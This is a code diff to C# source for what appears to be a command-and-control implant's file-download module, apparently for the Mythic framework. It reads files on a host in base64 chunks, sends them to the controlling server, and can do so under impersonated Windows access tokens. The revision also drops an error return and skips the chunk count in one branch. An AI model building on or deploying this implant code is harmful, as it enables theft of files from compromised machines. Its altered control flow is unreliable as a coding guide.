@@ -1,8 +1,10 @@
 ﻿using Agent.Interfaces;
 using Agent.Models;
 using Agent.Utilities;
+using System;
 using System.Collections.Concurrent;
 using System.Text.Json;
+using System.Security.Principal;
 
 namespace Agent
 {
@@ -30,45 +32,43 @@ namespace Agent
 
 
             DownloadArgs args = JsonSerializer.Deserialize<DownloadArgs>(job.task.parameters);
-            if (args is null || string.IsNullOrEmpty(args.file))
+
+            if(!args.Validate(out var message))
             {
                 await messageManager.AddResponse(new DownloadResponse
                 {
                     status = "error",
-                    process_response = new Dictionary<string, string> { { "message", "0x16" } },
+                    process_response = new Dictionary<string, string> { { "message", message } },
                     completed = true,
                     task_id = job.task.id
                 }.ToJson());
-                return;
             }
-
             ServerDownloadJob downloadJob = new ServerDownloadJob(job, args);
-
-            //Calculate the total number of chunks required
-            downloadJob.total_chunks = await GetTotalChunks(downloadJob);
+            if (job.task.token != 0)
+            {
+                if (OperatingSystem.IsWindows())
+                {
+                    await WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(job.task.token), async () =>
+                    {
+                        //Calculate the total number of chunks required
+                        downloadJob.total_chunks = await GetTotalChunks(downloadJob);
+                    });
+                }
+            }
+            else
+            {
+                //Calculate the total number of chunks required
+                downloadJob.total_chunks = await GetTotalChunks(downloadJob);
+            }
 
             //Add the job to the list of jobs
             downloadJobs.GetOrAdd(job.task.id, downloadJob);
-            
-            logger.Log($"Starting download job ({downloadJob.chunk_num}/{downloadJob.total_chunks})");
-            
-            //If there are no chunks, then we can't do anything
-            if (downloadJob.total_chunks == 0)
-            {
-                downloadJobs.Remove(job.task.id, out _);
-
-                await messageManager.AddResponse(new DownloadResponse
-                {
-                    status = "error",
-                    process_response = new Dictionary<string, string> { { "message", "0x16" } },
-                    completed = true,
-                    task_id = job.task.id
-                }.ToJson());
-            }
 
             //Send the first response, start download process.
             await messageManager.AddResponse(new DownloadResponse
             {
+                user_output = $"0/{downloadJob.total_chunks}",
+                //user_output = $",
                 download = new DownloadResponseData()
                 {
                     total_chunks = downloadJob.total_chunks,
@@ -78,11 +78,9 @@ namespace Agent
                     is_screenshot = false,
                     host = "",
                 },
-                user_output = string.Empty,
+                status = "processed",
                 task_id = job.task.id,
                 completed = false,
-                status = string.Empty,
-                file_id = null
             }.ToJson());
 
             if (job.task.token != 0)
@@ -95,80 +93,61 @@ namespace Agent
         {
             //Get Tracker job
             ServerDownloadJob downloadJob = this.GetJob(response.task_id);
-            //The job was cancelled by the user. We need to clean up and exit
-            if (downloadJob.cancellationtokensource.IsCancellationRequested)
+ 
+            if(response.status != "success" || downloadJob.cancellationtokensource.IsCancellationRequested)
             {
+                string message = "Cancelled by user.";
+                if (response.status != "success")
+                {
+                    message = "An error occurred while communicating with the server.";
+                }
+  
+                await this.messageManager.WriteLine(message, response.task_id, true, "error");
                 this.CompleteDownloadJob(response.task_id);
+                return;
             }
 
+            if (string.IsNullOrEmpty(downloadJob.file_id))
+            {
+                downloadJob.file_id = response.file_id;
+            }
+
+            downloadJob.chunk_num++;
+            bool completed = (downloadJob.chunk_num == downloadJob.total_chunks);
             //Prepare download response
             DownloadResponse dr = new DownloadResponse()
             {
                 task_id = response.task_id,
+                user_output = completed ? $"{downloadJob.file_id}" :$"{downloadJob.chunk_num}/{downloadJob.total_chunks}",
+                //user_output = downloadJob.chunk_num.ToString(),
                 download = new DownloadResponseData
                 {
                     is_screenshot = false,
-                    host = ""
-                }
+                    host = "",
+                    file_id = downloadJob.file_id,
+                    full_path = downloadJob.path,
+                    chunk_num = downloadJob.chunk_num,
+                },
+                status = completed ? String.Empty : "processed",
+                completed = (downloadJob.chunk_num == downloadJob.total_chunks),
             };
-
-            if (String.IsNullOrEmpty(downloadJob.file_id))
+         
+            if(downloadJob.task.token != 0)
             {
-                //We were never given as file id's so we're unable to track properly. Let the user know.
-                if (string.IsNullOrEmpty(response.file_id))
+                if (OperatingSystem.IsWindows())
                 {
-                    dr.status = "error";
-                    dr.process_response = new Dictionary<string, string> { { "message", "0x13" } };
-                    dr.completed = true;
-
-                    await messageManager.AddResponse(dr.ToJson());
-                    this.CompleteDownloadJob(response.task_id);
-                    return;
+                    await WindowsIdentity.RunImpersonated(this.tokenManager.GetImpersonationContext(downloadJob.task.token), async () =>
+                    {
+                        dr.download.chunk_data = await this.HandleNextChunk(downloadJob);
+                    });
                 }
-
-                //Update the file_id to the one provided by mythic
-                downloadJob.file_id = response.file_id;
             }
-
-            //If the response is not successful, try again.
-            if (response.status != "success")
+            else
             {
-                dr.file_id = downloadJob.file_id;
-                dr.download.chunk_num = downloadJob.chunk_num;
-                logger.Log($"Handling next chunk for file {downloadJob.file_id} ({downloadJob.chunk_num}/{downloadJob.total_chunks})");
-                if (downloadJob.task.token != 0)
-                {
-                    tokenManager.Impersonate(downloadJob.task.token);
-                }
                 dr.download.chunk_data = await this.HandleNextChunk(downloadJob);
-
-                await messageManager.AddResponse(dr.ToJson());
-                if (downloadJob.task.token != 0)
-                {
-                    tokenManager.Revert();
-                }
-                return;
             }
 
-            //If the response is successful, move onto the next chunk.
-            downloadJob.chunk_num++;
-            dr.completed = (downloadJob.chunk_num == downloadJob.total_chunks);
-            dr.file_id = downloadJob.file_id;
-            dr.user_output = String.Empty;
-            dr.download.full_path = downloadJob.path;
-            dr.download.total_chunks = -1;
-            dr.download.file_id = downloadJob.file_id;
-            dr.download.chunk_num = downloadJob.chunk_num;
-            if (downloadJob.task.token != 0)
-            {
-                tokenManager.Impersonate(downloadJob.task.token);
-            }
-            dr.download.chunk_data = await this.HandleNextChunk(downloadJob);
-            if (downloadJob.task.token != 0)
-            {
-                tokenManager.Revert();
-            }
-            logger.Log($"Handling next chunk for file {downloadJob.file_id} ({downloadJob.chunk_num}/{downloadJob.total_chunks})");
+
 
             await messageManager.AddResponse(dr.ToJson());
 
@@ -218,24 +197,22 @@ namespace Agent
                 }
                 long totalBytesRead = job.chunk_size * (job.chunk_num - 1);
 
-                using var fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read);
-                byte[] buffer = new byte[job.chunk_size];
-
-                FileInfo fileInfo = new FileInfo(job.path);
-
-                if (fileInfo.Length - totalBytesRead < job.chunk_size)
+                using (var fileStream = new FileStream(job.path, FileMode.Open, FileAccess.Read))
                 {
-                    job.complete = true;
-                    buffer = new byte[fileInfo.Length - job.bytesRead];
-                }
+                    byte[] buffer = new byte[job.chunk_size];
 
-                fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
-                job.bytesRead += fileStream.Read(buffer, 0, buffer.Length);
-                
-                fileStream.Close();
-                fileStream.Dispose();
+                    FileInfo fileInfo = new FileInfo(job.path);
 
-                return Misc.Base64Encode(buffer);
+                    if (fileInfo.Length - totalBytesRead < job.chunk_size)
+                    {
+                        job.complete = true;
+                        buffer = new byte[fileInfo.Length - job.bytesRead];
+                    }
+
+                    fileStream.Seek(job.bytesRead, SeekOrigin.Begin);
+                    job.bytesRead += fileStream.Read(buffer, 0, buffer.Length);
+                    return Misc.Base64Encode(buffer);
+                };
             }
             catch (Exception e)
             {
